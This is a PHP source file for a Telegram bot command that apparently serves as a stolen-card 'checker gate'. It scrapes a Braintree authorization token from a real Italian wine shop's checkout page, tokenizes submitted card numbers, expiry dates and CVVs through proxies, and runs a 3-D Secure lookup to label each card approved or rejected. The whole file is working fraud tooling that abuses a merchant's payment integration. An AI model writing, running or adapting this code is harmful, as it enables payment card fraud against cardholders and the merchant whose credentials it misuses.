<?php
$start_time = microtime(true);

if ($text == '/vbv') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Braintree vbv Lookup - /vbv \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

include 'Tools/Regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b>⚠ [𝑨𝑳𝑬𝑹𝑻] 𝑷𝑳𝑬𝑨𝑺𝑬 𝑪𝑯𝑬𝑪𝑲 𝑻𝑯𝑬 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑬𝑳𝑫𝑺 𝑨𝑵𝑫 𝑻𝑹𝒀 𝑨𝑮𝑨𝑰𝑵 - 𝑻𝒆𝒙𝒕 𝑺𝒉𝒐𝒖𝒍𝒅 𝑶𝒏𝒍𝒚 𝑪𝒐𝒏𝒕𝒂𝒊𝒏 𝒄𝒄 𝒎𝒐𝒏 𝒚𝒆𝒂𝒓 𝒄𝒗𝒗 </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
//include 'Tools/Antispam.php';

$i     = explode("|", $lista);
$cc    = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon   = $i[1];
$year  = $i[2];
$cvv   = $i[3];

if (number_format($mon) < 10){$mon = str_replace("0", "", $mon);};
if(strlen($year) == 2){
($year = "20"."$year");
};

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

function generate_guid()
{
    if (function_exists('com_create_guid') === true)
    {
        return trim(com_create_guid(), '{}');
    }
    $data = openssl_random_pseudo_bytes(16);
    assert(strlen($data) == 16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}
$guid = generate_guid();
include 'Tools/Proxy.php';
$max_retries = 3;
$retry_count = 0;
$aft = file_get_contents('Fil.txt');
# 02 Req..
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'braintree-version: 2018-05-10',
'authorization: Bearer '.$aft.'',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$guid.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mon.'","expirationYear":"'.$year.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl2 = curl_exec($ch);
$token = trim(strip_tags(getStr($curl2,'token":"','"')));
curl_close($ch);

if (empty($token)) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#01. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.wineowine.it/checkout/cart/');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'accept: application/json',
'cookie: _gcl_au=1.1.159394803.1681760287; userid_tag=i6ca4yopa-7ibjmu0he-4zt3qzgbl; PHPSESSID=5ca574c95d0f8f7f608de1b9b23648cd; wp_customerGroup=NOT%20LOGGED%20IN; _ga=GA1.2.1060419530.1681760288; _gid=GA1.2.122712621.1681760288; _dc_gtm_UA-38974996-1=1; _fbp=fb.1.1681760288187.142916489; form_key=t3vBqrbfmrO9Nu1R; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; __zlcmid=1FQlkpfDTDuaz3p; tun2u_cookiecompliance=true; form_key=t3vBqrbfmrO9Nu1R; private_content_version=701c4f95818c0253995f5a258cd53acf; mage-messages=; X-Magento-Vary=31f82a859aee72af44945c5dcc98575ee96a11ed; __atuvc=2%7C16; __atuvs=643da01f729e0223001; section_data_ids=%7B%22cart%22%3A1681760322%2C%22directory-data%22%3A1681760322%2C%22gtm%22%3A1681760322%7D',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl1 = curl_exec($ch);
$tk2 = trim(strip_tags(getStr($curl1,'clientToken":"','"')));
curl_close($ch);
$decodedtk2 = base64_decode($tk2);
$aft = trim(strip_tags(getStr($decodedtk2,'authorizationFingerprint":"','"')));
file_put_contents('Fil.txt', $aft);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙏𝙤𝙠𝙚𝙣 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/6j5mnzyxsd8x83n2/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"16.49","additionalInfo":{"billingLine1":"2626 Rue Barrier","billingCity":"limoges","billingState":"Barletta-Andria-Trani","billingPostalCode":"80126","billingCountryCode":"IT","billingPhoneNumber":"8600074456","billingGivenName":"rtentn","billingSurname":" gnybt"},"dfReferenceId":"0_7499676f-bd66-40e5-88c5-33f9e50e4d9b","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.67.0","cardinalDeviceDataCollectionTimeElapsed":1182},"authorizationFingerprint":"'.$aft.'","braintreeLibraryVersion":"braintree/web/3.67.0","_meta":{"merchantAppId":"www.wineowine.it","platform":"web","sdkVersion":"3.67.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$guid.'"}}');
$curl3 = curl_exec($ch);
$status = trim(strip_tags(getStr($curl3,'status":"','"')));
curl_close($ch);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙍𝙚𝙨𝙪𝙡𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($status, 'successful')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Approved ( $status )\n--» <u>Gateway </u> : Braintree vbv Lookup\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
else {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Rejected ( $status )\n--» <u>Gateway </u> : Braintree vbv Lookup\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Took ⌛</u> : <code>$time seconds (Retries - $retry_count) </code>\n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
curl_close($ch);

?>